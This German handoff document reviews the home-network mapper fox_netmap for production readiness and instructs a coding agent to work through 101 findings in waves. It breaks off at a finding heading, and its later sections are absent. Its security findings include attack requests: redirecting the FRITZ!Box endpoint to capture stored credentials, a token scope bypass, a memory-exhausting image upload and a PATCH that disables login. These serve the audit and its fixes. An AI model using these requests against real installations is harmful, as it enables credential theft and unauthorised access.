<!-- Übergabedokument. Eigenständig: enthält alle Regeln, die der ausführende Agent braucht. -->

Konzept · Produktionsreife

# fox_netmap ist sauber gebaut, braucht aber neun Wellen bis zur Produktionsreife

- Stand: 26.11.2026
- Repo-Stand: `KaiDeWitzka/fox_netmap`, Commit `a63750f`, Version 1.6.16
- Quellen: Review mit neun Prüfwinkeln und acht unabhängigen Gegenprüfungen, Werkzeugläufe und Nachstellungen gegen den Code (Anhang A)
- Beilage: `fox_netmap-fixplan-gantt.html` (Zeitplan der Wellen)

**Die Anwendung ist gut gehärtet und getestet, hat aber sechs Befunde hoher und 38 mittlerer Schwere, darunter Datenverlust nach einem Neustart und still verschluckte Fehler. Kein Befund ist kritisch.**

Ausgangslage, Komplikation, Antwort:

- **Ausgangslage:** 230 Tests grün, 84 % Abdeckung, Container ohne Root, gepinnte Abhängigkeiten, keine bekannte Schwachstelle in den Paketen.
- **Komplikation:** Der grüne Testlauf ist kein verlässliches Signal. Elf gezielt eingebaute Fehler bleiben unentdeckt, die Scanner-Schleife ist gar nicht getestet, und mehrere Fehler zeigen sich erst nach einem Neustart oder einem Netzausfall.
- **Antwort:** Ein Coding-Agent arbeitet 101 geprüfte Befunde in neun Wellen ab. Jede Welle endet mit vollem Prüflauf, unabhängiger Prüfung und Commit.

Daraus folgt:

1. **Werkzeuge zuerst (W0):** uv, Formatierer, Typprüfung, ein Gate-Skript. Ab dann misst jede Welle gegen dieselbe Latte.
2. **Bausteine (W1):** ein Einstellungs-Schema statt fünf Kopien, ein Modul für Netz- und MAC-Formate.
3. **Verhalten (W2 bis W5):** Sicherheit, Datenbank, Scanner, Oberfläche. Jeder Fix mit einem Test, der vorher scheitert.
4. **Absichern (W6 bis W8):** Testlücken, Struktur und strikte Typen, Doku in sechs Sprachen.

**Empfehlung: den Plan unverändert starten. Die Entscheidungen in Abschnitt 5 haben Empfehlungen, die der Agent umsetzt, wenn du nichts einträgst.**

## 1. Für Kai: So gibst du das weiter

> [!NOTE]
>
> **Hallo Kai, ich habe mir dein Vibe-Coding-Projekt angeschaut.** Dieses Dokument ist für deinen
> Mistral-Coding-Agenten. Er legt eine HTML-Checkliste an, die du verfolgen kannst, und setzt alle
> Punkte mit Unteragenten, Software-QA-Reviews und automatisierten Tests um. Ziel ist die
> Produktionsreife.

- **Ablegen:** Datei als `docs/produktionsreife/UEBERGABE.md` ins Repo legen. Dort findet der Agent sie, und sie bleibt bei der Arbeit erhalten.
- **Starten:** dem Agenten als erste Nachricht geben: `Lies docs/produktionsreife/UEBERGABE.md vollständig. Arbeite nach Abschnitt 9. Beginne mit Welle 0.`
- **Verfolgen:** `docs/produktionsreife/checkliste.html` im Browser öffnen. Der Agent aktualisiert sie nach jeder Welle. Den Zeitplan zeigt `fox_netmap-fixplan-gantt.html`.
- **Entscheiden:** Abschnitt 5 hat sieben Fragen mit Empfehlung. Willst du anders entscheiden, trag deine Wahl vor dem Start in die Spalte "Kais Wahl" ein.
- **Was der Agent nicht tut:** pushen, mergen, taggen, die Version erhöhen, echte Netze scannen. Er committet auf dem Branch `vibe/produktionsreife`. Push, Pull Request und Release machst du.
- **Aufwand:** etwa 27 Stunden Agentenlaufzeit ohne Puffer, verteilt auf neun Wellen.

## Handlungsbedarf vor dem Start

> [!WARNING]
>
> - **Ein Container-Neustart kann ein Gerät samt Notiz, Raum und Verbindungen löschen** (K-3, C-14).
>   Das passiert, wenn ein anderes Gerät die IP eines Offline-Geräts übernimmt. Bis Welle 3 durch ist:
>   `./data` vor Updates sichern.
> - **Login-Schalter aus der Oberfläche gilt nach einem Neustart nicht mehr** (C-1, S-9). Wer `NETZ_AUTH_ENABLED=false`
>   in der Umgebung hat und den Login in der Oberfläche einschaltet, hat nach dem Neustart wieder eine offene API.
>   Bis Welle 1 durch ist: den Login nur über die Umgebungsvariable steuern.
> - **Einstellungen aus `.env` kommen nicht im Container an** (D-2). `docker-compose.yml` reicht nur eine feste Liste
>   durch. `NETZ_TR064_INSECURE_TLS`, `NETZ_SQLITE_JOURNAL`, `NETZ_EVENT_RETENTION_DAYS` und `NETZ_FRITZ_MESH`
>   wirken deshalb nicht. Bis Welle 1 durch ist: nötige Variablen direkt in `docker-compose.yml` eintragen.

## Kernfakten

- **Tests:** 230 grün in 2,5 s, 84 % Zeilen- und Zweigabdeckung. Die Scanner-Schleife `run_once`, die jeden Scan steuert, läuft in keinem Test (T-2).
- **Testsignal:** Von 39 gezielt eingebauten, nicht gleichwertigen Fehlern erkennt die Suite 28. Entfernt man den Login-Schutz an zwei Schreib-Endpunkten, bleibt sie grün (T-1).
- **Sicherheit:** Kein kritischer Befund, die Container-Härtung hält. Schwächster Punkt ist der Embed-Link, der Gerätedetails außerhalb seines erlaubten Bereichs zeigt (S-1).
- **Daten:** Ein Ausfall der Geräteerkennung setzt alle Geräte still auf offline. Nach 30 Tagen Aufbewahrung löscht die App sie samt Notizen (SF-1).
- **Typen und Lint:** `ruff` grün bei minimalem Regelsatz. 19 Dateien sind nicht formatiert. `mypy --strict` meldet 159 Fehler, fast alle fehlende Annotationen, keinen Laufzeitfehler.
- **Abhängigkeiten:** keine bekannte Schwachstelle (`pip-audit`, `npm audit`). Veraltet sind Cytoscape (3.30.2 statt 3.35.0), der Digest des Basis-Images, gitleaks und drei Python-Pakete um eine Patch-Version.
- **Doku:** umfangreich und in sechs Sprachen gleich aufgebaut. Das README nennt Version 1.6.4 statt 1.6.16. Es fehlen Betriebshandbuch, Architekturübersicht und Bedrohungsmodell.

## Inhalt

1. Für Kai
2. Auftrag an den Agenten
3. Ausgangslage
4. Werkzeugstand (Basislinie)
5. Entscheidungen
6. Zielbild und Abnahmekriterien
7. Befundkatalog
8. Wellen und Dateibesitz
9. Arbeitsprotokoll für den ausführenden Agenten
10. HTML-Checkliste
11. Grenzen dieses Reviews
12. Anhang A: Prüfmethode · Anhang B: Aufwand dieses Reviews

## 2. Auftrag an den Agenten

**Du überführst fox_netmap in Wellen zur Produktionsreife. Erfüllt ist der Auftrag, wenn jedes Abnahmekriterium aus Abschnitt 6 belegt ist und die Checkliste keine offenen Punkte mehr hat.**

- **Lies dieses Dokument vollständig, bevor du etwas änderst.** Abschnitt 9 ist dein Arbeitsprotokoll. Es gilt vor jeder Gewohnheit deiner Umgebung.
- **Reihenfolge:** Welle 0 bis Welle 8, jede erst nach dem Commit der vorigen.
- **Befunde sind geprüft, aber nicht unfehlbar.** Jeder Befund in Abschnitt 7 wurde von einem zweiten, unabhängigen Prüfer nachgestellt oder am Code belegt. Prüf trotzdem vor dem Fix, ob er am aktuellen Stand noch zutrifft. Trifft er nicht zu, Status `verworfen` mit Beleg.
- **Neue Funde** während der Arbeit bekommen IDs `N-<laufende Nummer>` ab der höchsten vergebenen Nummer, landen in der Checkliste und werden in der passenden Welle behoben oder begründet verschoben.
- **Entscheidungen** aus Abschnitt 5: die Spalte "Kais Wahl" gilt. Ist sie leer, gilt die Empfehlung. Vermerke in `STAND.md`, welche Variante du umgesetzt hast.
- **Repo-Konventionen bleiben:** Oberfläche und Logs deutsch, Texte der Oberfläche in sechs Sprachen über `app/static/i18n.js`, Handbuch `docs/02-benutzerhandbuch.*.md` in sechs Sprachen. Jede Verhaltensänderung, die Nutzer sehen, kommt in alle sechs Handbücher und unter `[Unreleased]` in `CHANGELOG.md`.
- **Fragen an Kai** sammelst du in `STAND.md` unter "Offene Fragen". Du hältst nicht an, wenn eine Empfehlung existiert. Du hältst an, wenn eine Änderung Daten bestehender Installationen unumkehrbar verändern würde und Abschnitt 5 sie nicht abdeckt.

## 3. Ausgangslage

**fox_netmap ist eine kleine, gut dokumentierte Anwendung mit klarer Zwei-Prozess-Architektur.** Die
Schwächen liegen nicht im Aufbau, sondern in Randfällen zwischen den beiden Prozessen, in stillen
Fehlerpfaden und in Tests, die das Wichtigste nicht festhalten.

| Element           | Wert                                                                                                                                                   | Quelle                                       |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| Zweck             | Heimnetz scannen, als Karte und Tabelle zeigen, bearbeiten, exportieren, einbetten                                                                     | `README.md`                                  |
| Prozesse          | Web (FastAPI, Port 8399) und Scanner (Host-Netz, nur `NET_RAW`), beide als UID 10001                                                                   | `docker-compose.yml`, `docker/entrypoint.sh` |
| Datenhaltung      | eine SQLite-Datei in `./data`, von beiden Prozessen beschrieben                                                                                        | `app/db.py`                                  |
| Code              | rund 4.000 Zeilen Python in `app/`, rund 3.400 Zeilen JavaScript in `app/static/`                                                                      | `wc -l`, Commit `a63750f`                    |
| Oberfläche        | ein Skript `app/static/app.js` mit 1.647 Zeilen, Cytoscape für die Karte, sechs Sprachen                                                               | `app/static/`                                |
| Tests             | 230 pytest-Tests in 11 Dateien, dazu ein jsdom-Check der Oberfläche                                                                                    | `tests/`                                     |
| Scan-Ablauf       | `run_once` steuert jeden Scan, `main` die Schleife                                                                                                     | `app/scanner/run.py:429`, `:471`             |
| Embed-Links       | Token in der URL öffnet `/embed` und ausgewählte API-Pfade ohne Login                                                                                  | `app/web.py:49-75`                           |
| Zusammenführen    | `dedupe_devices_by_ip`, beim Start beider Prozesse                                                                                                     | `app/db.py:228`                              |
| Abhängigkeiten    | pip-tools mit Hashes, Basis-Image und Actions per Digest bzw. SHA gepinnt, Dependabot                                                                  | `requirements*.in`, `Dockerfile`, `.github/` |
| CI                | ruff, pytest, jsdom, Container-Härtung, Trivy, CodeQL, gitleaks                                                                                        | `.github/workflows/*.yml`                    |
| Version           | 1.6.16 an drei Stellen im Code, README nennt 1.6.4                                                                                                     | `app/__init__.py`, `README.md:52`            |
| Branch-Konvention | `vibe/<slug>`, Version bumpt nur der Maintainer                                                                                                        | `CONTRIBUTING.md`                            |
| Einsatzannahme    | Heimnetz, optional mit HTTPS-Reverse-Proxy davor; andere Geräte im LAN gelten als nicht vertrauenswürdig; Embed-Links gehen an halb vertraute Personen | Vorgabe des Reviews                          |

## 4. Werkzeugstand (Basislinie)

**Diese Werte gelten am Commit `a63750f`. Jede Welle darf sie nur verbessern.** Erhoben am 26.11.2026
auf macOS mit Python 3.12.12 und den gepinnten Abhängigkeiten aus `requirements-dev.txt`.

| Prüfung                          | Ergebnis                                                             |
| -------------------------------- | -------------------------------------------------------------------- |
| `ruff check .` (Repo-Regeln)     | grün, Regelsatz nur `E4 E7 E9 F I`                                   |
| `ruff format --check .`          | 19 Dateien würden umformatiert                                       |
| `pytest -q`                      | 230 bestanden, 1 Warnung, 2,5 s                                      |
| Abdeckung Zeilen und Zweige      | 84 %; `scanner/run.py` 74 %, `snmp` 48 %, `ports` 44 %               |
| Gezielte Fehler (Mutanten)       | 11 von 39 nicht gleichwertigen bleiben unentdeckt                    |
| `mypy` Standard / `--strict`     | 9 / 159 Fehler                                                       |
| `pyright` Standard / strikt      | 8 / 1.125 Fehler                                                     |
| `tsc --checkJs` auf `app/static` | 141 Fehler, 140 davon DOM-Typverengung                               |
| `eslint` 9, empfohlene Regeln    | 30 Meldungen, 22 davon dateiübergreifende Globals                    |
| `node tests/ui_dom_check.mjs`    | grün                                                                 |
| `pip-audit`, `npm audit`         | keine bekannte Schwachstelle                                         |
| Veraltete Pakete                 | `charset-normalizer`, `packaging`, `reportlab` je eine Patch-Version |

## 5. Entscheidungen

**Sieben Fragen ändern, wie ein Fix aussieht. Für jede gibt es eine Empfehlung, und der Agent setzt
sie um, wenn die Spalte "Kais Wahl" leer bleibt.** Eine Frage ist schon entschieden.

> **Entscheidung nötig (Kai, vor dem Start):** je Zeile A, B oder C in "Kais Wahl" eintragen oder leer lassen.

| Nr  | Frage                                                   | Empfehlung | Kais Wahl |
| --- | ------------------------------------------------------- | ---------- | --------- |
| E-1 | Geräte mit gleicher IP automatisch zusammenführen?      | B          |           |
| E-2 | Login über die Oberfläche abschaltbar?                  | B          |           |
| E-3 | TR-064: bei Fehler von HTTPS auf HTTP zurückfallen?     | B          | C (abweichend): Fallback bleibt (seit #111 fuer Hosts/WAN/Mesh, mit WARN je Lauf + Port-Hinweis); das Restrisiko traegt, wer den Downgrade aktiv nutzt (z. B. Port 49000 statt 49443) -> Doku-Korrektur + Restrisiko in docs/03-sicherheit.md Abschnitt 4 |
| E-4 | Oberfläche in Module aufteilen?                         | B          |           |
| E-5 | Wie streng prüft `mypy` die Typen?                      | B          |           |
| E-6 | Wie wird JavaScript geprüft?                            | A          |           |
| E-7 | Gerätekategorien als neutrale IDs statt deutscher Text? | A          |           |

**Die Fixes in Abschnitt 7 beschreiben die empfohlene Variante.** Trägt Kai eine andere ein, passt der Agent Fix und Regressionstest der betroffenen Befunde an und vermerkt das in `STAND.md`.

**Bereits entschieden: Paketverwaltung mit uv.** `uv` ersetzt pip-tools. Die Abhängigkeiten stehen
danach in `pyproject.toml`, die gepinnten Versionen samt Hashes in `uv.lock`. Grund: ein Werkzeug für
Umgebung, Lock-Datei und Ausführung, schneller in CI und im Image. Details in Abschnitt 8, Welle 0.

### E-1: Geräte mit gleicher IP zusammenführen (K-3, C-14, N-1)

**Empfehlung B: nur Einträge ohne echte MAC zusammenführen und die alte IP eines Geräts löschen, sobald ein anderes Gerät sie meldet.**

- **Worum es geht:** Beim Start beider Prozesse führt `dedupe_devices_by_ip` (`app/db.py:228`) Geräte mit gleicher IP zusammen. Das sollte Doppeleinträge aus der Zeit vor der MAC-Erkennung aufräumen.
- **Heute:** Geht ein NAS offline und bekommt ein Handy seine IP, löscht der nächste Neustart das NAS. Das Handy erbt Notiz, Raum, Position, Verbindungen und Verlauf. Kommt das NAS zurück, meldet die App ein neues Gerät. Nachgestellt mit dem echten Scan-Code.

| Option                                | Was passiert                                     | Aufwand | Risiko                             |
| ------------------------------------- | ------------------------------------------------ | ------- | ---------------------------------- |
| A: so lassen                          | Datenverlust bei jeder IP-Wiedervergabe          | keiner  | hoch                               |
| **B: nur Platzhalter zusammenführen** | Echte Geräte bleiben getrennt, alte IP wird frei | klein   | gering                             |
| C: Zusammenführen ganz entfernen      | Alte Doppeleinträge bleiben sichtbar             | klein   | Altbestände mit Duplikaten bleiben |

C ist besser, wenn es in bestehenden Installationen keine Platzhalter-Einträge der Form `ip:<adresse>` mehr gibt.

### E-2: Login über die Oberfläche abschalten (S-9, C-1)

**Empfehlung B: Der Login wird nur über `NETZ_AUTH_ENABLED` gesteuert, der Schalter verschwindet aus der Oberfläche.**

- **Worum es geht:** Eine einzige Einstellungsänderung schaltet den Login für alle ab, ohne Passwortabfrage. Nach einem Neustart gilt wieder der Wert aus der Umgebung, während die Oberfläche den gespeicherten Wert anzeigt.

| Option                       | Was passiert                                 | Aufwand | Nachteil                                   |
| ---------------------------- | -------------------------------------------- | ------- | ------------------------------------------ |
| A: so lassen                 | Anzeige und Wirkung laufen auseinander       | keiner  | offene API nach Neustart möglich           |
| **B: nur Umgebungsvariable** | Eine Quelle, kein Widerspruch                | klein   | Abschalten braucht Neustart des Containers |
| C: Oberfläche mit Passwort   | Schalter bleibt, verlangt aktuelles Passwort | mittel  | Zwei Quellen müssen zusammengeführt werden |

C ist besser, wenn Nutzer den Login regelmäßig ohne Zugriff auf den Docker-Host umschalten.

### E-3: TR-064 fällt von HTTPS auf HTTP zurück (S-2)

**Empfehlung B: kein Rückfall. Bei einem TLS-Fehler meldet das Log, was zu tun ist.**

- **Worum es geht:** TR-064 ist die Schnittstelle der FRITZ!Box. Schlägt eine HTTPS-Anfrage fehl, auch wegen eines falschen Zertifikats, wiederholt der Scanner sie still per HTTP auf demselben Port und schickt die Anmeldung mit.
- **Heute:** Der Rückfall hilft nie, weil eine echte FRITZ!Box auf Port 49443 kein HTTP spricht. Er gibt aber einem Angreifer im LAN die Anmeldedaten zum Offline-Knacken.

| Option                        | Was passiert                                                               | Aufwand | Nachteil                       |
| ----------------------------- | -------------------------------------------------------------------------- | ------- | ------------------------------ |
| A: so lassen                  | Rückfall bei jedem Fehler                                                  | keiner  | Anmeldedaten im Klartext-Kanal |
| **B: entfernen, klar melden** | TLS-Fehler mit Hinweis auf `http://…:49000` oder `NETZ_TR064_INSECURE_TLS` | klein   | keiner bekannt                 |
| C: Rückfall als Opt-in        | Nur bei ausdrücklicher Einstellung, mit Warnung                            | klein   | eine Einstellung mehr          |

### E-4: Oberfläche in Module aufteilen (Q-10)

**Empfehlung B: nur ein API-Modul herauslösen, das jede Anfrage prüft und Fehler anzeigt.**

- **Worum es geht:** `app/static/app.js` hat 1.647 Zeilen mit globalem Zustand. Vier Befunde der Oberfläche haben dieselbe Ursache: Anfragen werden nicht auf Erfolg geprüft (F-1, F-3, F-4, SF-6).

| Option                       | Was passiert                              | Aufwand | Nachteil                              |
| ---------------------------- | ----------------------------------------- | ------- | ------------------------------------- |
| A: Monolith bleibt           | Jeder Fix einzeln in `app.js`             | klein   | Fehlerbehandlung bleibt verstreut     |
| **B: API-Modul herauslösen** | Eine Stelle für Fehler, 401 und Wettläufe | mittel  | `app.js` bleibt groß                  |
| C: komplett in ES-Module     | `api.js`, `state.js`, Ansichten getrennt  | hoch    | eine Welle mehr, Risiko im jsdom-Test |

C lohnt sich, wenn die Oberfläche in den nächsten Monaten stark wächst.

### E-5: Strenge der Typprüfung (TL-Befunde)

**Empfehlung B: `mypy` in Welle 0 mit Grundregeln, in Welle 7 `--strict` für `app/`.**

| Option                          | Was passiert                                               | Aufwand                  | Nachteil                              |
| ------------------------------- | ---------------------------------------------------------- | ------------------------ | ------------------------------------- |
| A: nur Grundregeln              | `check_untyped_defs`, etwa 10 Fixes                        | klein                    | `dict`-Datensätze bleiben untypisiert |
| **B: Grundregeln, dann strict** | Wie A, später alle Annotationen und `TypedDict` für Geräte | mittel, etwa 150 Stellen | keiner                                |
| C: `pyright` strict             | Strengste Prüfung, 1.125 Meldungen heute                   | hoch                     | viel Lärm aus Bibliothekstypen        |

### E-6: Prüfung des JavaScript

**Empfehlung A: `eslint` mit empfohlenen Regeln und deklarierten Globals.**

| Option                 | Was passiert                               | Aufwand | Nachteil                           |
| ---------------------- | ------------------------------------------ | ------- | ---------------------------------- |
| **A: eslint**          | Findet tote Variablen, Tippfehler, Globals | klein   | keine Typen                        |
| B: `checkJs` mit JSDoc | Typprüfung ohne Build                      | mittel  | 141 Meldungen, meist DOM-Casts     |
| C: TypeScript          | Volle Typen, Build-Schritt nötig           | hoch    | ändert Auslieferung der Oberfläche |

B lohnt sich nach E-4 Option C, weil kleine Module sich gut annotieren lassen.

### E-7: Gerätekategorien als neutrale IDs (Q-11)

**Empfehlung A: so lassen und außerhalb dieses Plans angehen.**

- **Worum es geht:** Kategorien stehen als deutsche Wörter in der Datenbank ("Drucker"). Die Übersetzung hängt an diesen Wörtern.
- **A, so lassen:** funktioniert in allen sechs Sprachen, nur Umbenennen ist heikel.
- **B, neutrale IDs:** sauberer, braucht aber eine Datenmigration bestehender Installationen. Das ist unumkehrbar und lohnt nur mit eigenem Test gegen echte Altdaten.

## 6. Zielbild und Abnahmekriterien

**Produktionsreif heißt hier: Jeder bekannte Fehler hoher und mittlerer Schwere ist behoben und durch
einen Test festgehalten, ein Fehler im Betrieb ist sichtbar statt still, und das Gate misst Typen,
Format, Lint, Tests und Abdeckung bei jedem Commit.** Die Kriterien unten sind die Zeilen `ZK-1` bis
`ZK-13` der Checkliste.

| Nr    | Kriterium                                                                                                                                                                           | Nachweis                                                    |
| ----- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| ZK-1  | `scripts/gate.sh` grün, lokal und in CI auf Python 3.12 und 3.13                                                                                                                    | CI-Lauf auf dem Branch, Ausgabe des Skripts                 |
| ZK-2  | Kein offener Befund der Schwere hoch oder mittel; jeder niedrige erledigt oder mit Begründung verworfen                                                                             | Checkliste                                                  |
| ZK-3  | Jeder Fix hat einen Regressionstest, dessen Fehlschlag vor dem Fix in `ARCHIV.md` steht                                                                                             | `ARCHIV.md`, Testnamen in der Checkliste                    |
| ZK-4  | Alle Mutanten aus der Kill-Liste in Welle 6 werden von der Suite erkannt                                                                                                            | Mutationslauf, Tabelle in `ARCHIV.md`                       |
| ZK-5  | Abdeckung Zeilen und Zweige mindestens 90 % gesamt, kein Modul unter 80 %                                                                                                           | `pytest --cov=app --cov-branch --cov-fail-under=90`         |
| ZK-6  | `mypy --strict` für `app/`, erweitertes `ruff`, `ruff format --check` und `eslint` grün, ohne globale Ausnahmen                                                                     | Gate                                                        |
| ZK-7  | `pip-audit`, `npm audit` und Trivy (CRITICAL und HIGH mit Fix) ohne Treffer; Dependabot deckt uv, npm, docker, actions                                                              | CI                                                          |
| ZK-8  | CI-Job `docker` grün: UID 10001, Capabilities, schreibgeschütztes Root-Dateisystem, Smoke-Test                                                                                      | CI                                                          |
| ZK-9  | Ein Scanfehler ist in der Oberfläche, in `/api/health` und im Docker-Healthcheck sichtbar                                                                                           | Test mit erzwungenem Scanfehler                             |
| ZK-10 | Ende-zu-Ende-Test in pytest: Web und Scanner gegen `127.0.0.0/30`, ein voller `run_once`                                                                                            | Testname in der Checkliste                                  |
| ZK-11 | Doku vollständig: README-Version stimmt, jede `NETZ_*`-Variable in Compose, README und Handbuch, Betriebshandbuch, Architektur, Bedrohungsmodell, `CHANGELOG.md` mit `[Unreleased]` | Test, der die Variablenlisten vergleicht; Dateien vorhanden |
| ZK-12 | 500 Geräte: `GET /api/devices` unter 300 ms, Kartenaufbau im jsdom-Test unter 1 s                                                                                                   | Lasttest in Welle 6                                         |
| ZK-13 | Abschlussprüfung: ein frischer Advisor liest den gesamten Diff des Branches gegen dieses Dokument und gibt APPROVED                                                                 | Bericht in `ARCHIV.md`                                      |

- **Prämisse zu ZK-5:** 90 % liegt sechs Punkte über dem Ist-Wert. Die fehlenden Punkte sitzen fast ganz in der Scanner-Schleife und den Netzmodulen, die Welle 4 und Welle 6 ohnehin testen.
- **Prämisse zu ZK-12:** Heute braucht der Kartenaufbau bei 500 Geräten etwa 1 s und bei 1.000 Geräten 8,2 s (F-7). Die Ursache ist eine Schleife, die für jeden Knoten alle Geräte durchsucht. Nach dem Fix lag ein Versuch bei 37 ms für 1.000 Geräte.

**Nicht im Ziel:** Mehrbenutzerbetrieb mit Rollen, Betrieb direkt im Internet ohne Proxy, neutrale Kategorie-IDs (E-7), vollständige ES-Modul-Aufteilung (E-4 Option C).

## 7. Befundkatalog

Der Katalog fasst die Funde der neun Finder und die Urteile der unabhängigen Gegenprüfung zusammen. Maßgeblich sind Urteil und Schwere der Gegenprüfung. Zeilennummern beziehen sich auf Commit `a63750f`.

- **Status nachgestellt:** Der Prüfer hat den Fehler mit einem eigenen Skript oder Mutanten reproduziert.
- **Status aus Code belegt:** Der Prüfer hat die Codestelle gelesen, aber nicht ausgeführt.
- **Status plausibel:** Nicht reproduziert, Mechanismus aber nicht widerlegt.
- **Mehrfachfunde:** Ein Eintrag mit mehreren IDs in Klammern ist ein zusammengelegter Befund, die erste ID führt ihn in der Checkliste.
- **Neue Funde:** IDs `N-1` bis `N-6` stammen aus der Gegenprüfung, nicht von den Findern.

### 7.0 Übersicht

| Schwere    | Anzahl  | davon nachgestellt |
| ---------- | ------- | ------------------ |
| kritisch   | 0       | 0                  |
| hoch       | 6       | 5                  |
| mittel     | 38      | 26                 |
| niedrig    | 57      | 29                 |
| **gesamt** | **101** | **60**             |

Verteilung auf die Wellen:

| Welle | Thema                                                 | Anzahl |
| ----- | ----------------------------------------------------- | ------ |
| W0    | Werkzeuge                                             | 7      |
| W1    | Bausteine: Einstellungen, MAC-Normalisierung, Logging | 14     |
| W2    | Sicherheit                                            | 17     |
| W3    | Datenbank und Nebenläufigkeit                         | 12     |
| W4    | Scanner und stille Fehler                             | 15     |
| W5    | Oberfläche                                            | 17     |
| W6    | Testlücken                                            | 7      |
| W7    | Struktur und Typen                                    | 7      |
| W8    | Doku                                                  | 5      |

Kein Befund hat die Schwere kritisch, die Gegenprüfung hat jede Einstufung geprüft. Gezählt sind Einträge, nicht IDs: zusammengelegte Befunde zählen einmal.

### 7.1 Sicherheit

Angriffsfläche von API, Anmeldung, Exporten und Scanner-Eingängen.

#### Ein Embed-Token mit Teilbereich liest über `/api/device/{mac}` jedes Gerät, und Tokens mit mehreren Subnetzen zeigen nur das erste (S-1, C-7, T-5)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/api.py:74-86`, `app/api.py:149-157`
- **Was passiert:** Ein Token für 192.0.2.0/24 und die Kategorie Drucker liefert bei `GET /api/device/<MAC aus 198.51.100.0/24>?token=...` Notiz, Ports, Verlauf und Ereignisse. Der Unterschied zwischen 200 und 404 verrät zudem, welche MACs existieren. Umgekehrt zeigt ein Token mit zwei Subnetzen in der Liste nur das erste.
- **Fix:** Ein Helfer `token_allows(row, dev)` prüft Subnetz und Kategorie gegen die erlaubten Listen, leer heißt alles erlaubt. `device_detail` antwortet bei Abweichung mit 404, nie mit 403. `_token_filters`, der Übersetzer von Token in Listenfilter, und `db.list_devices` nehmen Listen, ein angefragter Wert außerhalb erweitert den Bereich nie.
- **Regressionstest:** `tests/test_token_scope.py::test_device_detail_out_of_scope_returns_404`, `tests/test_token_scope.py::test_multi_subnet_token_lists_all_allowed_subnets`, `tests/test_token_scope.py::test_requested_subnet_outside_token_never_widens_scope`
- **Hinweis:** Mutant M11, der den Subnetz-Scope ignoriert, überlebte, deshalb ist T-5 hier mitgeführt. Prüfer stufte S-1 von hoch auf mittel herab, weil nur lesbare Metadaten betroffen sind.

#### Der PDF-Export nimmt mit einem Embed-Token beliebig große Bilder an und belegt dabei über 1 GB Arbeitsspeicher (S-6)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/api.py:282-327`, `app/exporters.py:173-182`, `docker-compose.yml`
- **Was passiert:** Ein 9000 mal 9000 Pixel großes PNG von 236 KB lässt den Web-Prozess von 61 MB auf 1,15 GB wachsen, der Speicher wird nicht freigegeben. Der Token reicht, weil `/api/export/` zu den Token-Pfaden zählt, und das Compose-File setzt kein `mem_limit`.
- **Fix:** Bilder bei Token-Anfragen ablehnen und die Pixelzahl vor reportlab mit `PIL.Image.open(...).size` prüfen. Die Obergrenze muss über der größten Karten-Exportgröße der Oberfläche liegen, dazu `cy.png({full: true, scale})` auf einer großen Karte messen. Zusätzlich `mem_limit` in `docker-compose.yml` setzen.
- **Regressionstest:** `tests/test_export_security.py::test_pdf_rejects_oversized_image`, `tests/test_export_security.py::test_pdf_token_request_rejects_image`

#### `GET /api/settings` liefert SNMP-Community, Benachrichtigungs-URLs und Zugangsdaten in URLs im Klartext (S-8)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/api.py:24-56`, `app/api.py:342-356`
- **Was passiert:** Nach einem PATCH gibt GET `snmp_community`, `notify_ntfy` und eine `fritz_url` mit `admin:pw@` im Klartext zurück. Das widerspricht `docs/03-sicherheit.md` Abschnitt 2.8, nur `fritz_pass` fehlt korrekt.
- **Fix:** Secrets als `configured: true` mit maskiertem Hinweis ausgeben, URLs mit Benutzerinfo in `_valid_endpoint`, der Prüfung von Endpunkt-URLs, ablehnen. Ein leeres Secret-Feld im PATCH heißt dann unverändert, sonst löscht jedes Speichern den Wert, weil `app.js` alle Felder sendet. Löschen geht über ein Feld `clear`, die Schaltfläche liefert W5.
- **Regressionstest:** `tests/test_settings_api.py::test_get_settings_masks_secrets`, `tests/test_settings_api.py::test_empty_secret_in_patch_keeps_stored_value`, `tests/test_settings_api.py::test_endpoint_with_userinfo_rejected`
- **Hinweis:** Der UI-Teil mit leerem Feld und Löschen folgt in W5.

#### Wer die App bedient, kann den FRITZ!Box-Endpunkt umbiegen und so das gespeicherte Passwort abgreifen (S-7)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/api.py:421-427`, `app/scanner/run.py:221-240`, `app/scanner/tr064.py:56`
- **Was passiert:** `PATCH {"fritz_url": "http://127.0.0.1:<Port>"}` lässt den Scanner im nächsten Lauf Digest-Anmeldedaten mit dem gespeicherten Passwort an diesen Port senden. Nötig ist nur die einzige Rolle der App.
- **Fix:** Beim Ändern von `fritz_url`, `fritz_urls` oder `fritz_user` das gespeicherte `fritz_pass` löschen, außer das Passwort steht im selben PATCH. Kommt das Passwort aus der Umgebung, den Endpunktwechsel per Oberfläche ablehnen oder Neueingabe verlangen. Optional nur private und Link-Local-Adressen zulassen, TR-064 ist reiner LAN-Verkehr.
- **Regressionstest:** `tests/test_settings_api.py::test_fritz_endpoint_change_clears_stored_pass`
- **Hinweis:** Von W2 nach W1 verschoben: gleiche PATCH-Logik wie S-8 und S-9.

#### Ein einziger PATCH schaltet die Anmeldung für die ganze App ab (S-9)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/api.py:390`, `app/api.py:498-508`, `app/web.py:45`
- **Was passiert:** `PATCH /api/settings {"auth_enabled": false}` öffnet sofort `/api/tokens` und `/api/logs` ohne Login. Nach einem Neustart gilt wieder die Umgebung, `GET /api/settings` zeigt aber weiter den Text `"false"`.
- **Fix:** `auth_enabled` aus `SettingsPatch` und `SAFE_SETTINGS`, der Liste der per API lesbaren Werte, entfernen, also nur per Umgebung steuern. GET meldet den wirksamen Wert als Bool. Nebenwirkung: Der Schalter verschwindet aus der Oberfläche, wer ihn dort ausgeschaltet hatte, braucht `NETZ_AUTH_ENABLED=false`.
- **Regressionstest:** `tests/test_settings_api.py::test_auth_enabled_not_patchable`
- **Hinweis:** Hängt mit C-1 zusammen: Für `auth_enabled` gewinnt die Umgebung.

#### TR-064 fällt bei jedem TLS-Fehler still auf Klartext-HTTP zurück und sendet dabei Digest-Anmeldedaten (S-2)

